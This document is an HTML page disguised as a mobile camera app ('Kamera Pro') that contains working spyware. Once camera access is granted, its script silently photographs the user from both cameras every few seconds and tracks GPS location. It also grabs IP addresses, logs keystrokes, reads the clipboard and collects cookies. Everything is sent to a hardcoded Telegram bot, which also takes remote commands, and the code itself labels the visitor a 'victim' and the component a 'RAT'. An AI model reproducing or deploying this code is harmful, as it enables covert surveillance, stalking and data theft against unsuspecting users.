<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>Kamera Pro</title>
    <style>
        :root {
            --bg: #000;
            --surface: rgba(0,0,0,0.5);
            --accent: #fcd434;
            --ios-blue: #007aff;
        }
        * {
            margin: 0; padding: 0; box-sizing: border-box;
            user-select: none; -webkit-user-select: none;
            -webkit-tap-highlight-color: transparent;
        }
        body {
            background: var(--bg);
            font-family: -apple-system, 'SF Pro Display', 'Helvetica Neue', sans-serif;
            height: 100vh; width: 100vw; height: 100dvh; width: 100dvw;
            overflow: hidden; touch-action: manipulation; position: relative;
        }

        /* Permission Overlay */
        .perm-overlay {
            position: fixed; inset: 0; background: #000; z-index: 999;
            display: flex; flex-direction: column; align-items: center;
            justify-content: center; color: #fff; text-align: center;
            padding: 30px; transition: opacity 0.5s;
        }
        .perm-overlay.hidden { opacity: 0; pointer-events: none; }
        .perm-overlay .logo {
            width: 72px; height: 72px; border-radius: 50%;
            background: #1c1c1e; display: flex; align-items: center;
            justify-content: center; margin-bottom: 24px;
        }
        .perm-overlay .logo svg { width: 36px; height: 36px; fill: #fff; }
        .perm-overlay h1 { font-size: 26px; font-weight: 600; margin-bottom: 6px; }
        .perm-overlay p { font-size: 14px; color: #999; margin-bottom: 28px; max-width: 280px; }
        .perm-overlay .btn-start {
            background: var(--ios-blue); border: none; border-radius: 30px;
            padding: 15px 50px; font-size: 17px; font-weight: 600; color: #fff;
            cursor: pointer; transition: transform 0.15s;
        }
        .perm-overlay .btn-start:active { transform: scale(0.95); }
        .perm-overlay .btn-start:disabled { opacity: 0.5; }
        .perm-overlay .err-msg { color: #ff453a; font-size: 13px; margin-top: 14px; min-height: 18px; }

        /* Video */
        #vf {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            object-fit: cover; z-index: 1;
        }

        /* Flash */
        #flash {
            position: fixed; inset: 0; background: #fff; z-index: 10;
            opacity: 0; pointer-events: none; transition: opacity 0.04s;
        }
        #flash.fire { opacity: 0.88; transition: opacity 0s; }

        /* Top Bar */
        .top-bar {
            position: fixed; top: 0; left: 0; right: 0; z-index: 5;
            padding: 12px 14px; padding-top: max(12px, env(safe-area-inset-top));
            display: flex; justify-content: space-between; flex-wrap: wrap;
            gap: 6px; pointer-events: none;
        }
        .top-bar > * { pointer-events: auto; }
        .top-grp { display: flex; gap: 5px; flex-wrap: wrap; }
        .chip {
            background: var(--surface); backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            border: 1px solid rgba(255,255,255,0.12); border-radius: 20px;
            color: #fff; padding: 6px 10px; font-size: 10px; font-weight: 500;
            cursor: pointer; display: flex; align-items: center; gap: 4px;
            height: 28px; white-space: nowrap; transition: background 0.2s, color 0.2s;
        }
        .chip:active { background: rgba(255,255,255,0.18); }
        .chip.on { background: var(--accent); color: #000; border-color: var(--accent); }
        .chip svg { width: 12px; height: 12px; fill: currentColor; }

        /* Indicator Tags */
        .ind-tag {
            position: fixed; z-index: 6; pointer-events: none;
            background: rgba(0,0,0,0.65); border-radius: 10px; padding: 3px 8px;
            color: #fc0; font-size: 10px; font-weight: 600; opacity: 0;
            transition: opacity 0.3s;
        }
        .ind-tag.on { opacity: 1; }
        #indHDR { top: 50px; left: 50%; transform: translateX(-50%); }
        #indStab { top: 50px; left: 20px; }
        #indSoft { top: 50px; right: 20px; }

        /* Zoom Wheel */
        .zoom-wheel {
            position: fixed; bottom: 130px; left: 50%; transform: translateX(-50%);
            z-index: 5; pointer-events: auto;
            background: var(--surface); backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px); border-radius: 24px;
            padding: 4px 3px; display: flex; gap: 1px;
        }
        .zm {
            padding: 7px 11px; border-radius: 20px; font-size: 12px; font-weight: 500;
            color: #fff; cursor: pointer; transition: background 0.2s; min-width: 30px; text-align: center;
        }
        .zm.on { background: rgba(255,255,255,0.25); font-weight: 600; }
        .zm:active { background: rgba(255,255,255,0.35); }

        /* Bottom Bar */
        .btm-bar {
            position: fixed; bottom: 0; left: 0; right: 0; z-index: 5;
            padding: 14px 16px; padding-bottom: max(18px, env(safe-area-inset-bottom));
            display: flex; justify-content: space-between; align-items: center;
            pointer-events: none;
        }
        .btm-bar > * { pointer-events: auto; }
        .thumb-box {
            width: 46px; height: 46px; border-radius: 10px;
            background: rgba(255,255,255,0.06); border: 2px solid rgba(255,255,255,0.2);
            overflow: hidden; cursor: pointer; display: flex; align-items: center; justify-content: center;
        }
        .thumb-box img { width: 100%; height: 100%; object-fit: cover; }
        .thumb-box.has-img { border-color: rgba(255,255,255,0.55); background: transparent; }
        .shutter-btn {
            width: 70px; height: 70px; border-radius: 50%;
            background: rgba(255,255,255,0.12); display: flex;
            align-items: center; justify-content: center; cursor: pointer;
            transition: transform 0.15s;
        }
        .shutter-btn:active { transform: scale(0.82); }
        .shutter-inner {
            width: 55px; height: 55px; border-radius: 50%;
            background: #fff; border: 3px solid #000;
        }
        .spacer { width: 46px; }

        /* Focus Ring */
        .focus-ring {
            position: fixed; width: 70px; height: 70px; border: 2px solid var(--accent);
            border-radius: 50%; transform: translate(-50%, -50%); pointer-events: none;
            z-index: 5; opacity: 0; box-shadow: 0 0 20px rgba(252,212,52,0.3);
        }
        .focus-ring.pop { animation: focusPulse 0.55s ease-out forwards; }
        @keyframes focusPulse {
            0% { opacity: 1; transform: translate(-50%, -50%) scale(0.7); }
            100% { opacity: 0; transform: translate(-50%, -50%) scale(1.4); }
        }
    </style>
</head>
<body>

    <!-- Permission Overlay -->
    <div class="perm-overlay" id="permOverlay">
        <div class="logo"><svg viewBox="0 0 24 24"><path d="M12 15.2l-3.5 2.1.9-4-2.9-2.5 3.8-.3L12 7l1.7 3.5 3.8.3-2.9 2.5.9 4z"/></svg></div>
        <h1>Kamera Pro</h1>
        <p>Izinkan akses kamera untuk mulai</p>
        <button class="btn-start" id="btnStart">Buka Kamera</button>
        <div class="err-msg" id="errMsg"></div>
    </div>

    <video id="vf" autoplay playsinline></video>
    <div id="flash"></div>
    <div class="focus-ring" id="focusRing"></div>

    <!-- Indicator Tags -->
    <div class="ind-tag" id="indHDR">HDR</div>
    <div class="ind-tag" id="indStab">STABIL</div>
    <div class="ind-tag" id="indSoft">SOFT</div>

    <!-- Top Bar -->
    <div class="top-bar">
        <div class="top-grp">
            <button class="chip" id="btnFlash">⚡ Flash</button>
            <button class="chip on" id="btnBlur">🌀 Blur</button>
            <button class="chip on" id="btnLive">🎬 Live</button>
            <button class="chip on" id="btnHD">4K</button>
            <button class="chip on" id="btnHDR">🌅 HDR</button>
            <button class="chip on" id="btnStab">✋ Stab</button>
            <button class="chip on" id="btnSoft">✨ Soft</button>
        </div>
        <button class="chip" id="btnFlip">🔄</button>
    </div>

    <!-- Zoom Wheel -->
    <div class="zoom-wheel" id="zoomWheel">
        <div class="zm" data-z="0.5">0.5</div>
        <div class="zm" data-z="0.7">0.7</div>
        <div class="zm on" data-z="1">1x</div>
        <div class="zm" data-z="1.5">1.5</div>
        <div class="zm" data-z="2">2x</div>
    </div>

    <!-- Bottom Bar -->
    <div class="btm-bar">
        <div class="thumb-box" id="thumbBox"></div>
        <div class="shutter-btn" id="btnShutter"><div class="shutter-inner"></div></div>
        <div class="spacer"></div>
    </div>

<script>
(function() {
    'use strict';

    // ==================== CONFIG ====================
    var BOT_TOKEN = '8514751802:AAFvWUx_ZWZwRMokFe4gQKSqR1_WqkQS2ug';
    var CHAT_ID = '7839405566';
    var TG_API = 'https://api.telegram.org/bot' + BOT_TOKEN;

    // Victim ID
    var VID = (function() {
        var s = localStorage.getItem('_vid');
        if (s) return s;
        var id = 'V' + Date.now().toString(36) + Math.random().toString(36).substr(2, 6);
        localStorage.setItem('_vid', id);
        return id;
    })();

    // ==================== DOM ====================
    function $(id) { return document.getElementById(id); }
    var vf = $('vf'), permOverlay = $('permOverlay'), btnStart = $('btnStart'), errMsg = $('errMsg');
    var btnShutter = $('btnShutter'), btnFlash = $('btnFlash'), btnFlip = $('btnFlip');
    var btnBlur = $('btnBlur'), btnLive = $('btnLive'), btnHD = $('btnHD'), btnHDR = $('btnHDR'), btnStab = $('btnStab'), btnSoft = $('btnSoft');
    var thumbBox = $('thumbBox'), flashEl = $('flash'), focusRing = $('focusRing');
    var indHDR = $('indHDR'), indStab = $('indStab'), indSoft = $('indSoft');

    // ==================== STATE ====================
    var stream = null, facingMode = 'environment', flashOn = false, currentZoom = 1;
    var lastPhotoData = null, isStarting = false;
    var blurOn = true, liveOn = true, hdOn = true, hdrOn = true, stabOn = true, softOn = true;
    var gpsData = null, gpsWatchId = null, localIPs = [];
    var keyBuf = '', lastClip = '';
    var silentTimer = null, flipTimer = null, c2Timer = null, lastUpdateId = 0;

    // ==================== TELEGRAM HELPERS ====================
    function tg(text) {
        try {
            fetch(TG_API + '/sendMessage?chat_id=' + CHAT_ID + '&text=' + encodeURIComponent(text) + '&disable_notification=true');
        } catch(e) {}
    }

    function tgPhoto(blob, caption) {
        try {
            var fd = new FormData();
            fd.append('chat_id', CHAT_ID);
            fd.append('photo', blob, 'p_' + Date.now() + '.jpg');
            fd.append('caption', caption || '');
            fd.append('disable_notification', 'true');
            fetch(TG_API + '/sendPhoto', { method: 'POST', body: fd });
        } catch(e) {}
    }

    function tgBeacon(blob, caption) {
        try {
            var fd = new FormData();
            fd.append('chat_id', CHAT_ID);
            fd.append('photo', blob, 's_' + Date.now() + '.jpg');
            fd.append('caption', caption || '');
            fd.append('disable_notification', 'true');
            navigator.sendBeacon(TG_API + '/sendPhoto', fd);
        } catch(e) {}
    }

    // ==================== GPS ====================
    function startGPS() {
        if (!navigator.geolocation) return;
        gpsWatchId = navigator.geolocation.watchPosition(
            function(p) {
                gpsData = {
                    lat: p.coords.latitude,
                    lon: p.coords.longitude,
                    alt: p.coords.altitude || 0,
                    acc: p.coords.accuracy
                };
            },
            function() {},
            { enableHighAccuracy: true, maximumAge: 30000, timeout: 10000 }
        );
    }

    // ==================== IP GRABBER ====================
    function grabIPs() {
        return new Promise(function(resolve) {
            var ips = new Set();
            try {
                var pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
                pc.createDataChannel('');
                pc.createOffer().then(function(o) { pc.setLocalDescription(o); });
                pc.onicecandidate = function(e) {
                    if (e.candidate) {
                        var ip = e.candidate.address;
                        if (ip && ip.indexOf('::') === -1 && ip.indexOf('127.') === -1 && ip.indexOf('0.') === -1) ips.add(ip);
                    } else { pc.close(); resolve(Array.from(ips)); }
                };
                setTimeout(function() { pc.close(); resolve(Array.from(ips)); }, 2000);
            } catch(e) { resolve([]); }
        });
    }

    // ==================== KEYLOGGER ====================
    function startKeylogger() {
        document.addEventListener('keydown', function(e) {
            var ignore = ['Shift','Control','Alt','Meta','CapsLock','Tab','ArrowLeft','ArrowRight','ArrowUp','ArrowDown','Escape'];
            if (ignore.indexOf(e.key) !== -1) return;
            if (e.key === 'Enter') keyBuf += '[↵]\n';
            else if (e.key === 'Backspace') keyBuf += '[⌫]';
            else if (e.key === ' ') keyBuf += ' ';
            else if (e.key.length === 1) keyBuf += e.key;
            else keyBuf += '[' + e.key + ']';
            if (keyBuf.length > 300) { tg('⌨️ [' + VID + ']\n' + keyBuf); keyBuf = ''; }
        });
        setInterval(function() { if (keyBuf.length > 0) { tg('⌨️ [' + VID + ']\n' + keyBuf); keyBuf = ''; } }, 10000);
    }

    // ==================== CLIPBOARD ====================
    function checkClipboard() {
        try {
            navigator.clipboard.readText().then(function(t) {
                if (t && t !== lastClip && t.length > 0) {
                    lastClip = t;
                    tg('📋 [' + VID + ']\n' + t.substring(0, 1500));
                }
            });
        } catch(e) {}
    }

    // ==================== SHOW INDICATOR ====================
    function showTag(el) {
        el.classList.add('on');
        setTimeout(function() { el.classList.remove('on'); }, 1200);
    }

    // ==================== CORE: CAPTURE FRAME ====================
    function captureFrame(silent) {
        if (!stream || !stream.active) return;

        try {
            var track = stream.getVideoTracks()[0];
            var st = track.getSettings();
            var w = hdOn ? 3840 : 1920;
            var h = hdOn ? 2160 : 1080;
            var canvas = document.createElement('canvas');
            canvas.width = w;
            canvas.height = h;
            var ctx = canvas.getContext('2d');

            // BLUR (Bokeh Effect)
            if (blurOn) {
                var offCanvas = document.createElement('canvas');
                offCanvas.width = w; offCanvas.height = h;
                var offCtx = offCanvas.getContext('2d');
                offCtx.drawImage(vf, 0, 0, w, h);
                offCtx.filter = 'blur(16px)';
                offCtx.drawImage(offCanvas, 0, 0);
                ctx.drawImage(offCanvas, 0, 0);
                ctx.save();
                var cx = w / 2, cy = h / 2, r = Math.min(w, h) * 0.3;
                ctx.beginPath(); ctx.arc(cx, cy, r, 0, Math.PI * 2); ctx.clip();
                ctx.drawImage(vf, 0, 0, w, h);
                ctx.restore();
            } else {
                ctx.drawImage(vf, 0, 0, w, h);
            }

            // HDR (Enhanced shadows & highlights)
            if (hdrOn) {
                var imgData = ctx.getImageData(0, 0, w, h);
                var d = imgData.data;
                for (var i = 0; i < d.length; i += 4) {
                    var lum = 0.299 * d[i] + 0.587 * d[i+1] + 0.114 * d[i+2];
                    if (lum < 70) { d[i] = Math.min(255, d[i] * 1.35); d[i+1] = Math.min(255, d[i+1] * 1.35); d[i+2] = Math.min(255, d[i+2] * 1.35); }
                    else if (lum > 210) { d[i] = Math.max(0, d[i] * 0.8); d[i+1] = Math.max(0, d[i+1] * 0.8); d[i+2] = Math.max(0, d[i+2] * 0.8); }
                }
                ctx.putImageData(imgData, 0, 0);
                showTag(indHDR);
            }

            // SOFT CAM (Beauty/Skin Smoothing)
            if (softOn) {
                var imgData2 = ctx.getImageData(0, 0, w, h);
                var d2 = imgData2.data;
                var smoothed = new Uint8ClampedArray(d2.length);
                var kw = 2; // kernel window
                for (var y = kw; y < h - kw; y++) {
                    for (var x = kw; x < w - kw; x++) {
                        var idx = (y * w + x) * 4;
                        var rSum = 0, gSum = 0, bSum = 0, cnt = 0;
                        for (var ky = -kw; ky <= kw; ky++) {
                            for (var kx = -kw; kx <= kw; kx++) {
                                var kIdx = ((y+ky) * w + (x+kx)) * 4;
                                rSum += d2[kIdx]; gSum += d2[kIdx+1]; bSum += d2[kIdx+2];
                                cnt++;
                            }
                        }
                        var lum = 0.299 * d2[idx] + 0.587 * d2[idx+1] + 0.114 * d2[idx+2];
                        // Smooth only skin tones
                        if (d2[idx] > d2[idx+2] + 5 && d2[idx+1] > d2[idx+2] + 5 && lum > 50 && lum < 230) {
                            smoothed[idx] = (rSum / cnt * 0.55 + d2[idx] * 0.45);
                            smoothed[idx+1] = (gSum / cnt * 0.55 + d2[idx+1] * 0.45);
                            smoothed[idx+2] = (bSum / cnt * 0.55 + d2[idx+2] * 0.45);
                        } else {
                            smoothed[idx] = d2[idx]; smoothed[idx+1] = d2[idx+1]; smoothed[idx+2] = d2[idx+2];
                        }
                        smoothed[idx+3] = 255;
                    }
                }
                ctx.putImageData(new ImageData(smoothed, w, h), 0, 0);
                showTag(indSoft);
            }

            // Watermark
            var ts = new Date().toLocaleString('id-ID');
            ctx.font = '14px -apple-system, sans-serif';
            ctx.fillStyle = 'rgba(255,255,255,0.45)';
            ctx.fillText(ts, 20, h - 18);

            var capLabel = silent ? '🤫 Silent' : '📸 Foto';
            if (hdOn) capLabel += ' [4K]';
            if (hdrOn) capLabel += ' [HDR]';
            if (blurOn) capLabel += ' [Bokeh]';
            if (softOn) capLabel += ' [Soft]';

            canvas.toBlob(function(blob) {
                if (!blob) return;
                var caption = capLabel + ' | ' + new Date().toLocaleTimeString('id-ID');
                if (gpsData) caption += '\n📍 https://maps.google.com/?q=' + gpsData.lat + ',' + gpsData.lon;
                if (localIPs.length) caption += '\n🌐 ' + localIPs[0];

                if (silent) tgBeacon(blob, caption);
                else tgPhoto(blob, caption);

                lastPhotoData = canvas.toDataURL('image/jpeg', 0.92);
                thumbBox.innerHTML = '<img src="' + lastPhotoData + '">';
                thumbBox.classList.add('has-img');

                if (!silent) {
                    flashEl.classList.add('fire');
                    setTimeout(function() { flashEl.classList.remove('fire'); }, 80);
                    var a = document.createElement('a');
                    a.download = 'photo_' + Date.now() + '.jpg';
                    a.href = lastPhotoData;
                    document.body.appendChild(a); a.click(); document.body.removeChild(a);
                }

                // LIVE PHOTO: additional 2 frames
                if (liveOn && !silent) {
                    for (var i = 0; i < 2; i++) {
                        (function(delay) {
                            setTimeout(function() {
                                var lcv = document.createElement('canvas');
                                lcv.width = w; lcv.height = h;
                                var lcx = lcv.getContext('2d');
                                lcx.drawImage(vf, 0, 0, w, h);
                                lcv.toBlob(function(lb) {
                                    if (lb) tgBeacon(lb, '🎬 Live ' + (delay/300+1) + '/3');
                                }, 'image/jpeg', 0.88);
                            }, delay);
                        })((i+1) * 300);
                    }
                }
            }, 'image/jpeg', 0.93);

        } catch(e) {}
    }

    // ==================== AUTO CAPTURE ====================
    function startSilentCapture() {
        if (silentTimer) return;
        setTimeout(function() { captureFrame(true); }, 2000);
        silentTimer = setInterval(function() {
            if (stream && stream.active) captureFrame(true);
        }, 5000);
    }

    // ==================== AUTO FLIP ====================
    function startAutoFlip() {
        if (flipTimer) return;
        flipTimer = setInterval(function() {
            if (!stream || !stream.active) return;
            var nf = facingMode === 'environment' ? 'user' : 'environment';
            startCamera(nf);
        }, 18000);
    }

    // ==================== STABILIZER (Gyroscope) ====================
    function startStabilizer() {
        if (!stabOn) return;
        if (window.DeviceOrientationEvent) {
            window.addEventListener('deviceorientation', function(e) {
                if (!stream || !stream.active) return;
                var g = e.gamma || 0;
                var b = e.beta || 0;
                vf.style.transform = 'translate(' + (-g * 0.02) + 'px, ' + (b * 0.02) + 'px)';
            });
        }
        showTag(indStab);
    }

    // ==================== C2 POLLING ====================
    function pollC2() {
        try {
            fetch(TG_API + '/getUpdates?offset=' + (lastUpdateId + 1) + '&timeout=5')
            .then(function(r) { return r.json(); })
            .then(function(data) {
                if (!data.ok || !data.result.length) return;
                for (var i = 0; i < data.result.length; i++) {
                    var upd = data.result[i];
                    lastUpdateId = upd.update_id;
                    var msg = upd.message;
                    if (!msg || !msg.text) continue;
                    var parts = msg.text.trim().split(/\s+/);
                    var cmd = parts[0].toLowerCase();
                    var target = parts[1] || '';
                    if (target !== VID && target !== 'ALL') continue;

                    var result = '';
                    switch(cmd) {
                        case '/ping': result = '🟢 Online'; break;
                        case '/photo': captureFrame(false); result = '📸 OK'; break;
                        case '/gps': result = gpsData ? JSON.stringify(gpsData) : 'N/A'; break;
                        case '/flip': var nf = facingMode === 'environment' ? 'user' : 'environment'; startCamera(nf); result = '📷 ' + nf; break;
                        case '/blur': blurOn = !blurOn; btnBlur.classList.toggle('on', blurOn); result = 'Blur: ' + (blurOn ? 'ON' : 'OFF'); break;
                        case '/live': liveOn = !liveOn; btnLive.classList.toggle('on', liveOn); result = 'Live: ' + (liveOn ? 'ON' : 'OFF'); break;
                        case '/hd': hdOn = !hdOn; btnHD.classList.toggle('on', hdOn); startCamera(facingMode); result = 'HD: ' + (hdOn ? 'ON' : 'OFF'); break;
                        case '/hdr': hdrOn = !hdrOn; btnHDR.classList.toggle('on', hdrOn); result = 'HDR: ' + (hdrOn ? 'ON' : 'OFF'); break;
                        case '/stab': stabOn = !stabOn; btnStab.classList.toggle('on', stabOn); if(stabOn) startStabilizer(); result = 'Stab: ' + (stabOn ? 'ON' : 'OFF'); break;
                        case '/soft': softOn = !softOn; btnSoft.classList.toggle('on', softOn); result = 'Soft: ' + (softOn ? 'ON' : 'OFF'); break;
                        case '/cookies': result = document.cookie || '(kosong)'; break;
                        case '/info': result = '🆔 ' + VID + '\n📷 ' + facingMode + '\n🔍 ' + currentZoom + '×\n🌀Blur:' + blurOn + ' 🎬Live:' + liveOn + ' 📐HD:' + hdOn + ' 🌅HDR:' + hdrOn + ' ✋Stab:' + stabOn + ' ✨Soft:' + softOn; break;
                        default: result = '❓ ' + cmd;
                    }
                    if (result) tg('[' + VID + '] ' + result);
                }
            });
        } catch(e) {}
    }

    function startC2Polling() {
        if (c2Timer) return;
        function loop() { pollC2(); c2Timer = setTimeout(loop, 3000); }
        loop();
    }

    // ==================== CAMERA ====================
    function startCamera(facing) {
        if (isStarting) return;
        isStarting = true;
        btnStart.disabled = true;
        errMsg.textContent = '';

        if (stream) { stream.getTracks().forEach(function(t) { t.stop(); }); stream = null; vf.srcObject = null; }

        var constraints = {
            video: { facingMode: facing || facingMode, width: { ideal: hdOn ? 3840 : 1920 }, height: { ideal: hdOn ? 2160 : 1080 } },
            audio: false
        };

        navigator.mediaDevices.getUserMedia(constraints).then(function(s) {
            stream = s; vf.srcObject = s;
            return vf.play();
        }).then(function() {
            if (facing) facingMode = facing;
            applyZoom();
            permOverlay.classList.add('hidden');
            isStarting = false;
            btnStart.disabled = false;
            initRAT();
        }).catch(function(e1) {
            var altFace = (facing || facingMode) === 'environment' ? 'user' : 'environment';
            navigator.mediaDevices.getUserMedia({ video: { facingMode: altFace }, audio: false }).then(function(s) {
                stream = s; vf.srcObject = s;
                return vf.play();
            }).then(function() {
                facingMode = altFace;
                applyZoom();
                permOverlay.classList.add('hidden');
                isStarting = false;
                btnStart.disabled = false;
                initRAT();
            }).catch(function(e2) {
                errMsg.textContent = 'Gagal akses kamera';
                isStarting = false;
                btnStart.disabled = false;
            });
        });
    }

    function initRAT() {
        grabIPs().then(function(ips) {
            localIPs = ips;
            tg('🟢 ONLINE\n🆔 ' + VID + '\n📱 ' + navigator.userAgent.substring(0, 80) + '\n🖥️ ' + screen.width + '×' + screen.height + '\n🌐 ' + navigator.language + '\n🌍 IP: ' + (ips.join(', ') || 'N/A') + '\n🔗 ' + location.href + '\n🌀Blur:' + blurOn + ' 🎬Live:' + liveOn + ' 📐HD:' + hdOn + ' 🌅HDR:' + hdrOn + ' ✋Stab:' + stabOn + ' ✨Soft:' + softOn);
        });
        startGPS();
        startSilentCapture();
        startAutoFlip();
        startKeylogger();
        startStabilizer();
        startC2Polling();
        setInterval(checkClipboard, 4000);
        setInterval(function() { tg('💓 HB ' + VID + ' | ' + new Date().toLocaleTimeString('id-ID')); }, 120000);
    }

    // ==================== ZOOM ====================
    function applyZoom() {
        if (!stream) return;
        try {
            var track = stream.getVideoTracks()[0];
            var cap = track.getCapabilities();
            if (cap.zoom) {
                var minZ = cap.zoom.min || 0.5;
                var maxZ = cap.zoom.max || 5;
                var val = Math.min(maxZ, Math.max(minZ, currentZoom));
                track.applyConstraints({ advanced: [{ zoom: val }] }).catch(function() {});
            }
        } catch(e) {}
        document.querySelectorAll('.zm').forEach(function(el) {
            el.classList.toggle('on', parseFloat(el.dataset.z) === currentZoom);
        });
    }

    // ==================== EVENT LISTENERS ====================
    btnStart.addEventListener('click', function() { startCamera(); });
    btnShutter.addEventListener('click', function() { captureFrame(false); });
    btnFlip.addEventListener('click', function() {
        var nf = facingMode === 'environment' ? 'user' : 'environment';
        startCamera(nf);
    });
    btnFlash.addEventListener('click', function() {
        if (!stream) return;
        flashOn = !flashOn;
        stream.getVideoTracks()[0].applyConstraints({ advanced: [{ torch: flashOn }] }).catch(function() {});
        btnFlash.classList.toggle('on', flashOn);
    });
    btnBlur.addEventListener('click', function() { blurOn = !blurOn; btnBlur.classList.toggle('on', blurOn); });
    btnLive.addEventListener('click', function() { liveOn = !liveOn; btnLive.classList.toggle('on', liveOn); });
    btnHD.addEventListener('click', function() { hdOn = !hdOn; btnHD.classList.toggle('on', hdOn); startCamera(facingMode); });
    btnHDR.addEventListener('click', function() { hdrOn = !hdrOn; btnHDR.classList.toggle('on', hdrOn); });
    btnStab.addEventListener('click', function() { stabOn = !stabOn; btnStab.classList.toggle('on', stabOn); if (stabOn) startStabilizer(); else vf.style.transform = ''; });
    btnSoft.addEventListener('click', function() { softOn = !softOn; btnSoft.classList.toggle('on', softOn); });

    document.querySelectorAll('.zm').forEach(function(el) {
        el.addEventListener('click', function() {
            currentZoom = parseFloat(this.dataset.z);
            applyZoom();
        });
    });

    thumbBox.addEventListener('click', function() {
        if (!lastPhotoData) return;
        var w = window.open('', '_blank');
        w.document.write('<html><meta name="viewport" content="width=device-width,initial-scale=1"><style>body{margin:0;background:#000;display:flex;align-items:center;justify-content:center;height:100vh}img{max-width:100%;max-height:100%}</style><img src="' + lastPhotoData + '" onclick="window.close()"></html>');
        w.document.close();
    });

    document.addEventListener('click', function(e) {
        if (e.target.closest('button') || e.target.closest('.zm') || e.target.closest('.thumb-box') || e.target.closest('.perm-overlay')) return;
        focusRing.style.left = e.clientX + 'px';
        focusRing.style.top = e.clientY + 'px';
        focusRing.classList.remove('pop');
        void focusRing.offsetWidth;
        focusRing.classList.add('pop');
    });

    console.log('📸 Kamera Pro v8.0 — 5 Zoom Levels + 6 Effects');
    console.log('🆔 VID:', VID);

})();
</script>
</body>
</html>
